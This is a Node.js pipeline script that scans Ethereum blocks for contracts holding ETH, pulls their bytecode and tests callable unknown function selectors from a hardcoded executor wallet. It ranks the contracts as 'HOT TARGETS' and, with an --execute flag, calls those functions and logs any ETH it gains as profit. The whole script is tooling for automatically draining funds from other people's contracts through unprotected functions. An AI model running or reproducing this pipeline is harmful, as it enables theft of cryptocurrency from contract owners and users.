#!/usr/bin/env node
/**
 * Full Intelligence Pipeline — one command, all phases.
 *
 * Usage:
 *   node scripts/pipeline.js 10000000 35000000          # scan range
 *   node scripts/pipeline.js 10000000 35000000 --execute # scan + auto-execute profitable
 *   node scripts/pipeline.js --from-discovery data/discovered-contracts-*.txt  # skip Phase 1
 *
 * Phases:
 *   1. Event-based contract discovery (eth_getLogs)
 *   2. Multicall3 mass balance check + token pricing
 *   3. Bytecode analysis + exploit patterns + unknown selector sim
 *   4. Score + vectorize + report + execute
 */

const fs = require('fs');
const path = require('path');
const { RpcClient, ContractScanner, Executor } = require('../src/scanner');
const { Vectorizer } = require('../src/scanner/vectorizer');
const { Scorer } = require('../src/scanner/scorer');
const { makeLogger, setLevel } = require('../src/logger');

const log = makeLogger('pipeline');
setLevel(process.env.LOG_LEVEL || 'info');

const RPC = process.env.RPC_URL || 'http://127.0.0.1:8545';
const DATA = path.join(__dirname, '..', 'data');
const EXECUTE = process.argv.includes('--execute');

if (!fs.existsSync(DATA)) fs.mkdirSync(DATA, { recursive: true });

async function phase1_discover(rpc, startBlock, endBlock) {
  log.info(`PHASE 1: Event discovery — blocks ${startBlock} to ${endBlock}`);
  const { execSync } = require('child_process');
  const cmd = `node scripts/event-discovery.js ${startBlock} ${endBlock}`;
  execSync(cmd, { stdio: 'inherit', cwd: path.join(__dirname, '..') });

  const file = path.join(DATA, `discovered-contracts-${startBlock}-${endBlock}.txt`);
  if (!fs.existsSync(file)) throw new Error(`Discovery output not found: ${file}`);
  const addresses = fs.readFileSync(file, 'utf8').trim().split('\n').filter(Boolean);
  log.info(`  found ${addresses.length} contracts`);
  return addresses;
}

async function phase2_balance(rpc, addresses) {
  log.info(`PHASE 2: Balance check — ${addresses.length} contracts`);
  const funded = [];
  const BATCH = 150;

  for (let i = 0; i < addresses.length; i += BATCH) {
    const chunk = addresses.slice(i, i + BATCH);
    const calls = chunk.map(addr => ({ method: 'eth_getBalance', params: [addr, 'latest'] }));

    try {
      const results = await rpc.batch(calls);
      for (let j = 0; j < chunk.length; j++) {
        const bal = results[j];
        if (bal && !bal.error && typeof bal === 'string') {
          const wei = BigInt(bal);
          if (wei > 1000000000000000n) { // > 0.001 ETH
            funded.push({ address: chunk[j], ethBalance: wei, ethFormatted: (Number(wei) / 1e18).toFixed(6) });
          }
        }
      }
    } catch (err) {
      log.warn(`  batch failed at ${i}: ${err.message}`);
    }

    if (i % 3000 === 0 && i > 0) {
      log.info(`  checked ${i}/${addresses.length} | funded: ${funded.length}`);
    }
  }

  funded.sort((a, b) => Number(b.ethBalance - a.ethBalance));
  log.info(`  funded: ${funded.length} contracts with > 0.001 ETH`);
  return funded;
}

async function phase3_analyze(rpc, funded) {
  log.info(`PHASE 3: Deep analysis — ${funded.length} funded contracts`);
  const BATCH = 50;

  // Batch get code
  for (let i = 0; i < funded.length; i += BATCH) {
    const chunk = funded.slice(i, i + BATCH);
    const calls = chunk.map(c => ({ method: 'eth_getCode', params: [c.address, 'latest'] }));

    try {
      const codes = await rpc.batch(calls);
      for (let j = 0; j < chunk.length; j++) {
        const code = codes[j];
        if (!code || code === '0x' || code.error) {
          chunk[j].destroyed = true;
          chunk[j].selectors = [];
          continue;
        }

        const hex = code.toLowerCase().replace('0x', '');
        chunk[j].codeSize = hex.length / 2;
        chunk[j].destroyed = false;

        // Extract selectors
        const sels = new Set();
        const regex = /63([0-9a-f]{8})14/g;
        let m;
        while ((m = regex.exec(hex)) !== null) sels.add(m[1]);
        chunk[j].selectors = [...sels];

        // EIP-1167 check
        if (hex.startsWith('363d3d373d3d3d363d73')) {
          chunk[j].isProxy = true;
          chunk[j].proxyType = 'eip1167-minimal';
          chunk[j].implementation = '0x' + hex.substring(20, 60);
        }

        // EOF check
        if (hex.startsWith('ef01')) {
          chunk[j].isEOF = true;
        }
      }
    } catch (err) {
      log.warn(`  code batch failed at ${i}: ${err.message}`);
    }
  }

  // Sim unknown selectors on funded non-EOF contracts
  const OUR = process.env.EXECUTOR_WALLET || '0x7a3E312Ec6e20a9F62fE2405938EB9060312E334';
  let simmed = 0;

  for (const c of funded) {
    if (c.destroyed || c.isEOF || !c.selectors || c.selectors.length === 0) continue;

    c.callableSelectors = [];
    const simCalls = c.selectors.slice(0, 30).map(sel => ({
      method: 'eth_estimateGas',
      params: [{ from: OUR, to: c.address, data: '0x' + sel }],
    }));

    try {
      const results = await rpc.batch(simCalls);
      for (let j = 0; j < results.length; j++) {
        const gas = results[j];
        if (gas && !gas.error && typeof gas === 'string') {
          const g = parseInt(gas, 16);
          if (g > 26000) {
            c.callableSelectors.push({ selector: c.selectors[j], gas: g });
          }
        }
      }
    } catch (err) { /* batch failed, skip */ }

    if (c.callableSelectors.length > 0) {
      simmed++;
      log.info(`  ${c.address} — ${c.ethFormatted} ETH — ${c.callableSelectors.length} callable (gas > 26K)`);
    }
  }

  log.info(`  ${simmed} contracts have callable non-view functions`);
  return funded;
}

async function phase4_score(rpc, funded, startBlock, endBlock) {
  log.info(`PHASE 4: Score + vectorize + report`);

  const scorer = new Scorer();
  const vectorizer = new Vectorizer(DATA);
  const executor = new Executor(rpc);

  const results = [];

  for (const c of funded) {
    const score = scorer.score(c);
    const vector = vectorizer.vectorize(c);

    results.push({
      address: c.address,
      ethBalance: c.ethFormatted,
      codeSize: c.codeSize || 0,
      selectors: c.selectors?.length || 0,
      callableNonView: c.callableSelectors?.length || 0,
      isProxy: c.isProxy || false,
      isEOF: c.isEOF || false,
      score: score.combined,
      tier: score.tier,
      dimensions: score.dimensions,
    });

    // Execute on HOT targets if flag set
    if (EXECUTE && score.tier === 'HOT' && c.callableSelectors?.length > 0) {
      for (const sel of c.callableSelectors) {
        const execResult = await executor.evaluate({
          target: c.address,
          callData: '0x' + sel.selector,
          fnName: `unknown(${sel.selector})`,
          contractEthBalance: c.ethBalance,
        });
        if (execResult.profitable) {
          log.info(`*** PROFITABLE: ${execResult.profitEth?.toFixed(6)} ETH from ${c.address}`);
        }
      }
    }
  }

  results.sort((a, b) => b.score - a.score);

  // Write reports
  const tag = `${startBlock}-${endBlock}`;
  const reportFile = path.join(DATA, `pipeline-results-${tag}.json`);
  fs.writeFileSync(reportFile, JSON.stringify({ scan: { startBlock, endBlock, total: results.length, hot: results.filter(r => r.tier === 'HOT').length, warm: results.filter(r => r.tier === 'WARM').length }, results: results.slice(0, 200) }, null, 2));

  vectorizer.write(`pipeline-vectors-${tag}.jsonl`);

  // Summary
  console.log('\n' + '='.repeat(60));
  console.log('  PIPELINE COMPLETE');
  console.log('='.repeat(60));
  console.log(`  Range: ${startBlock} - ${endBlock}`);
  console.log(`  Contracts discovered: (from Phase 1 output)`);
  console.log(`  Funded: ${funded.length}`);
  console.log(`  HOT: ${results.filter(r => r.tier === 'HOT').length}`);
  console.log(`  WARM: ${results.filter(r => r.tier === 'WARM').length}`);
  console.log(`  Vectors: ${vectorizer.vectors.length}`);

  if (results.filter(r => r.tier === 'HOT').length > 0) {
    console.log('\n  --- HOT TARGETS ---');
    for (const r of results.filter(r => r.tier === 'HOT').slice(0, 20)) {
      console.log(`  ${r.ethBalance} ETH  score=${r.score.toFixed(3)}  callable=${r.callableNonView}  ${r.address}`);
    }
  }

  console.log('\n  Report: ' + reportFile);
  console.log('='.repeat(60) + '\n');

  return results;
}

async function main() {
  const rpc = new RpcClient(RPC);
  const health = await rpc.checkHealth();
  if (health.status === 'unreachable') {
    log.error('Aggregator not running — start with: npm start');
    process.exit(1);
  }
  log.info(`aggregator: ${health.availableProviders} providers`);

  let addresses;
  const fromDiscovery = process.argv.indexOf('--from-discovery');

  if (fromDiscovery !== -1) {
    const file = process.argv[fromDiscovery + 1];
    addresses = fs.readFileSync(file, 'utf8').trim().split('\n').filter(Boolean);
    log.info(`loaded ${addresses.length} contracts from ${file}`);
  } else {
    const startBlock = parseInt(process.argv[2] || '10000000');
    const endBlock = parseInt(process.argv[3] || '35000000');
    addresses = await phase1_discover(rpc, startBlock, endBlock);
  }

  const startBlock = parseInt(process.argv[2] || '10000000');
  const endBlock = parseInt(process.argv[3] || '35000000');

  const funded = await phase2_balance(rpc, addresses);
  const analyzed = await phase3_analyze(rpc, funded);
  await phase4_score(rpc, analyzed, startBlock, endBlock);
}

main().catch(err => {
  log.error(`Pipeline failed: ${err.message}`);
  process.exit(1);
});
